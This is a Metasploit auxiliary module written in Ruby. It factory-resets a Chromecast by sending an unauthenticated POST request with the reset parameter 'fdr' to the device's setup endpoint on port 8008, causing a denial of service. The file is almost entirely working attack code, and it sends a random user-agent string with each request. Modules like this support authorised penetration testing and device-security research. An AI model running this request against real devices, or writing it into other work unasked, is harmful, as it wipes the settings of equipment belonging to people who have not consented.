##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Chromecast Factory Reset DoS',
      'Description' => %q{
        This module performs a factory reset on a Chromecast, causing a denial of service (DoS).
        No user authentication is required.
      },
      'Author' => ['wvu'],
      'References' => [
        ['URL', 'http://www.google.com/intl/en/chrome/devices/chromecast/index.html'] # vendor website
      ],
      'License' => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(8008)
    ], self.class)
  end

  def run
    res = reset

    if res && res.code == 200
      print_good('Factory reset performed')
    elsif res
      print_error("An error occurred: #{res.code} #{res.message}")
    end
  end

  def reset
    begin
      send_request_raw(
        'method' => 'POST',
        'uri' => '/setup/reboot',
        'agent' => Rex::Text.rand_text_english(rand(42) + 1),
        'ctype' => 'application/json',
        'data' => '{"params": "fdr"}'
      )
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e)
    ensure
      disconnect
    end
  end

end
